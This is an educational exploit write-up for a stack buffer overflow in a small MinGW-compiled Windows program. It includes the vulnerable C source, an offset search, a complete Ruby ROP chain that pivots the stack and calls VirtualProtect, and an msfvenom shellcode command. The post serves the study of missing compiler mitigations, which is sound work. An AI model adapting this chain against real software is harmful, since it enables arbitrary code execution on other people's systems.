While experimenting with the Windows exploit mitigation policies, I noticed that MinGW-GCC does not enable most of the modern protections by default.
<br/>
This post is more like a writeup, demonstrating an exploit that can be adapted to work on other vulnerable programs compiled with the same compiler, also, it does not require knowledge of the version of the Windows DLLs in use, or the virtual addresses where they are loaded.
<br/>
Tested on Windows 10 Professional, version ``1803``
<br/>
gcc version ``8.3.0`` (Rev2, Built by MSYS2 project), latest at the time I am writing this.

# Prerequisites:
- Basics of buffer overflow vulnerabilities
- a basic understanding of Return Oriented Programming (ROP)

# Vulnerable program:

Let's take a very simple program:

```c
#include <stdio.h>
#include <windows.h>

void vuln()
{
	char name[60];
	scanf("%s", &name);
	printf("name = %s\n", name);
}

int main()
{
	setvbuf(stdout, NULL, _IONBF, 0); // disable stdout buffering
	printf("--*   BOF EXPERIMENT 1 *--\n");
	vuln();
	Sleep(1);
}
```
compile it with:

```
gcc prog.c -o prog.exe
```

The compiled executable can be found [here](/files/when_exploit_mitigations_are_disabled_on_modern_systems/prog.exe).

# Vulnerability

There is a clear vulnerability in the line ``scanf("%s", &name);``, because scanf doesn't know the size of the name buffer, it can read more than ``60`` character, thus overflowing the stack.
<br/>
This program, albeit vulnerable, shouldn't be exploitable on modern systems, a lot of effort has been put to mitigate memory corruption vulnerabilities, but surprisingly, it is!

# Analysis of the executable

First, let's check the exploit mitigations enabled on the executable by running ``Process Explorer`` (from ``sysinternals``).

[![No ASLR](/img/when_exploit_mitigations_are_disabled_on_modern_systems/no_aslr.png)](/img/when_exploit_mitigations_are_disabled_on_modern_systems/no_aslr.png)

Surprisingly, we notice that ``ASLR`` is not enabled, and it's the case for many other programs, this is already a big issue, this means that the imagebase of the main module (prog.exe) is fixed (and can be found in the headers).
<br/>
``DEP`` is enabled.

By having a look at the import table, we also notice that the compiler has added imports we didn't reference from our code, one particularly interesting import is ``VirtualProtect``, which is similar to the ``mprotect`` syscall on Linux (it changes the protections of pages of memory).

[![Import Table](/img/when_exploit_mitigations_are_disabled_on_modern_systems/import_table.png)](/img/when_exploit_mitigations_are_disabled_on_modern_systems/import_table.png)

Also, a quick check using ``x64dbg`` reveals that ``SSP`` protection is disabled.

<div class="reminder">``reminder`` (click to expand)</div>
<div class="reminder-content">
``ASLR`` stands for Address Space Layout Randomization, on Windows, it ensures that the module will be loaded at a dynamic virtual address that will change on each reboot.
<br/>``DEP`` stands for Data Execution Protection, it's a protection that ensures that the data sections (like the stack) are not executable, it prevents the classical buffer overflow attacks that overwrite the return address with the address of the user-controlled data, and execute shellcode directly.
<br/>``SSP`` (for Stack Smashing Protector) is a protection that aims to detect buffer overflows, each function starts by saving a random value (a cookie) on the stack right next to its saved base pointer, and when it's about to return, it checks if that value has changed, when a buffer overflow occurs, if the attacker doesn't know that random value, any stack overflow will be detected.
</div>
# Exploitation

## Initial plan

Let's start by causing a crash, and finding the offset to the return address.

We will use ``pattern_create`` and ``pattern_offset`` from ``metasploit-framework``.

```
ruby pattern_create.rb 200
=> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

[![Finding the offset to the return address](/img/when_exploit_mitigations_are_disabled_on_modern_systems/finding_offset.png)](/img/when_exploit_mitigations_are_disabled_on_modern_systems/finding_offset.png)

```
ruby pattern_offset.rb "Ac4Ac5Ac"
=> 72
```

okay, return address at offset ``72``, let's elaborate an exploit plan.

First, we don't know how much memory we have on the stack to read our payload (``rsp`` might leave the stack region while reading our payload), in order to make our exploit more reliable, we will ``scanf`` on a region that is ``-RW`` (``.bss`` section for example), and then we will pivot the stack (make ``rsp`` point to that region instead).

Then, we will return to ``VirtualProtect`` to make sections on the main module ``ERW``.

Finally, we will read our shellcode to the ``ERW`` memory, and we will jump to it.

Doing this is not straightforward, as ``DEP`` is enabled, we cannot execute our own code, we are obliged to reuse the existing code in the application, this is where ROP comes into play.

## Searching for ROP gadgets in the application

We will use ``rp++`` to search for ROP gadgets in the ``.text`` section of the main module.
```
rp++ -f prog.exe -r 4 --unique
```

[[![Rop Gadgets](/img/when_exploit_mitigations_are_disabled_on_modern_systems/rop_gadgets.png)](/img/when_exploit_mitigations_are_disabled_on_modern_systems/rop_gadgets.png)](/img/when_exploit_mitigations_are_disabled_on_modern_systems/rop_gadgets.png)

The gadgets we find particularly interesting are the following:


| Address       | Gadget                                                                                  | Desired Effect                  |

| 0x0040172c    | pop rsp ;<br/> ret                                                                      | pivot the stack                 |
| 0x00402353    | jmp qword [rax]                                                                         | jmp to what a pointer points to |

	
<div class="reminder">``reminder`` (click to expand)</div>
<div class="reminder-content">
``ROP`` (Return Oriented Programming), is an exploitation technique commonly used to bypass ``DEP``, since you can't execute shellcode directly, you carefully choose some instruction sequences that generally finish with ``ret`` or ``jmp`` from the ``.text`` section such that when you execute them sequentially, you get the effect you want, these sequences are called gadgets.
<br/>
The calling convention in use is ``__fastcall``, first four arguments are passed in ``rcx``,``rdx``,``r8``,``r9``, four qwords of shadowspace must also be allocated on the stack prior to the call (we will be using the gadget at ``0x004010a7`` to deallocate the shadowspace, because the function will not clean the stack for us).
</div>
## Implementing the exploit

I split the exploit in multiple parts, to make it easier to follow.

Let's set some variables that will act as parameters in our payload.
```ruby
fake_stack = 0x407100; # in the .bss section
jmp_scanf = 0x402bf8; # trampoline jmp to scanf
virtualprotect_ptr = 0x408294; # address of the pointer to VirtualProtect that is in the import table
```

I am representing the payload as an array of qwords, converting the array to a payload string is simple (refer to the whole exploit code for more informations).
### Part1 - Initial Buffer overflow, stack pivoting

Because some gadgets end with ``add rsp, 0x28;``, we will follow them with ``[ 0 ] * (0x28 / 8)`` (that is, 0x28/8=5 qwords), so that we get to the next gadget on the chain after executing them.

```ruby
# first thing to do : scanf("%s", fake_stack); rsp = fake_stack
part1 = [ 0x6161616161616161 ] * (72/8) # 72 bytes (72/8 qwords) to get to the return address
part1 += [ 0x004019cf, 0xdeadbeefdeadbeef, 0x00402a1d ] + [ 0 ] * (0x28/8) # set rax = r8;
part1 += [ 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set r8 = 0
part1 += [ 0x004019cf, fake_stack, 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set rax = fake_stack, set r8=fake_stack
part1 += [ 0x00402a1d ] + [ 0 ] * (0x28 / 8) # set rdx = fake_stack
part1 += [ 0x00402bc0, 0x404000, jmp_scanf, 0x004010a7, 0, 0, 0, 0, 0, 0x0040172c, fake_stack ] # set rcx = address of "%s"; scanf(rcx="%s",rdx=fake_stack); set rsp=fake_stack
# now, the stack will become fake_stack
```

### Part2 - VirtualProtect the main module to ERW, scanf on ERW memory, and jump to it:
One challenge we face here is that we have no gadget to control the ``r9`` register, and we need it because ``VirtualProtect`` takes ``4`` arguments (fourth argument is just a pointer that retrieves the old protections).
Using ``objdump``, and looking for instructions containing ``r9``, we find this sequence:

[![Set R9](/img/when_exploit_mitigations_are_disabled_on_modern_systems/set_r9.png)](/img/when_exploit_mitigations_are_disabled_on_modern_systems/set_r9.png)

Let's pick the gadget at ``0x4027ff``, if we set ``rcx = 0;`` and ``rax`` such that ``dword[rax+0xc] == 0`` and ``dword [rax+8] == 0;``, then it will have the effect : ``r9 = rax+0x28;``, finding such a value for rax is simple enough, especially in a section like the ``.bss``.


```ruby
# next thing to do : VirtualProtect(0x401000, 0x11000, 7, any_writable_address)
part2 = [ 0x004019cf, 0x407400, 0x00402bc0, 0, 0x4027ff ] # set rax=0x407400; set rcx=0; set r9 = 0x407400 + 0x28
part2 += [ 0x004019cf, 0xdeadbeefdeadbeef, 0x00402a1d ] + [ 0 ] * (0x28/8); # set rax = r8;
part2 += [ 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set r8 = 0
part2 += [ 0x004019cf, 0x11000, 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set rax = 0x11000; set r8 = 0x11000
part2 += [ 0x00402a1d ] + [ 0 ] * (0x28 / 8) # set rdx = 0x11000
part2 += [ 0x004019cf, 0x11000^0x40, 0x004010a4] + [ 0 ] * (0x28 / 8) # set rax=0x11000^0x40; set r8 = r8^rax = 0x40
part2 += [ 0x00402bc0, 0x401000, 0x004019cf, virtualprotect_ptr, 0x00402353, 0x004010a7, 0, 0, 0, 0, 0 ] # set rcx=0x401000; set rax = virtualprotect_ptr; jmp [virtualprotect_ptr]
# now, 0x11000 bytes from 0x401000 should be ERW
# next thing to do : scanf("%s", 0x401000)
part2 += [ 0x004019cf, 0xdeadbeefdeadbeef, 0x00402a1d ] + [ 0 ] * (0x28/8); # set rax = r8;
part2 += [ 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set r8 = 0
part2 += [ 0x004019cf, 0x401000, 0x004010a4 ] + [ 0 ] * (0x28 / 8) # set rax = 0x401000; set r8 = 0x401000
part2 += [ 0x00402a1d ] + [ 0 ] * (0x28 / 8) # set rdx = 0x401000
part2 += [ 0x00402bc0, 0x404000, jmp_scanf, 0x00401000 ] # set rcx = address of "%s"; scanf(rcx="%s",rdx=0x401000); return to 0x401000
```
### Part3 - Final shellcode

Great! now, we can run any shellcode we want, the only constraint is that it must not contain whitespace characters (because scanf will stop reading input if it encounters such characters).

Let's just generate a shellcode that pops the Windows calculator with msfvenom (part of Metasploit Framework), ``-b`` stands for bad chars, an encoder will be used to avoid these whitespace characters.


```
msfvenom -p windows/x64/exec CMD=calc.exe -f ruby -b "\x09\x0a\x0b\x0c\x0d\x20"
```

# Conclusion

In the exploit, we have mostly used gadgets that should be present in every executable compiled with ``mingw-gcc``, the only gadgets specific to this executable are the ones reading input (using ``scanf`` function), while programs differ in the way they read input, almost any stack buffer overflow can be turned into arbitary code execution using an approach similar to the one explained in this article.
